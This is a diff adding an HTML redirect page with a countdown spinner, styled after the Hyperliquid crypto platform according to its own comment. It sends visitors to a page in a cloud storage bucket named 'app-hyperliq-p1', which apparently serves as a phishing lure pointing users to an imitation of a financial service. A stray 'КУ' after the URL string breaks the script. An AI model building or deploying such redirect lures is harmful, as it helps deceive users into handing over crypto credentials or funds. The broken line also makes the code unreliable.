@@ -1,0 +1,77 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>Redirecting...</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+  <style>
+    body {
+      margin: 0;
+      height: 100vh;
+      background: #000000;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-family: Arial, Helvetica, sans-serif;
+      color: #d1ffe8; /* светлый hyperliquid */
+    }
+
+    .container {
+      text-align: center;
+    }
+
+    .spinner {
+      width: 64px;
+      height: 64px;
+      border: 3px solid #00ff9c;
+      border-top-color: transparent;
+      border-radius: 50%;
+      margin: 0 auto 32px;
+      animation: spin 1s linear infinite;
+    }
+
+    @keyframes spin {
+      to { transform: rotate(360deg); }
+    }
+
+    .text {
+      font-size: 22px;
+      margin-bottom: 12px;
+      opacity: 0.85;
+    }
+
+    .countdown {
+      font-size: 48px;
+      font-weight: bold;
+      color: #00ff9c;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="spinner"></div>
+    <div class="text">
+      You will be automatically redirected via
+    </div>
+    <div class="countdown" id="countdown">5</div>
+  </div>
+
+  <script>
+    let seconds = 5;
+    const countdownEl = document.getElementById("countdown");
+
+    const redirectUrl = "https://storage.googleapis.com/app-hyperliq-p1/index.html"; КУ
+
+    const timer = setInterval(() => {
+      seconds--;
+      countdownEl.textContent = seconds;
+
+      if (seconds <= 0) {
+        clearInterval(timer);
+        window.location.href = redirectUrl;
+      }
+    }, 1000);
+  </script>
+</body>
+</html>
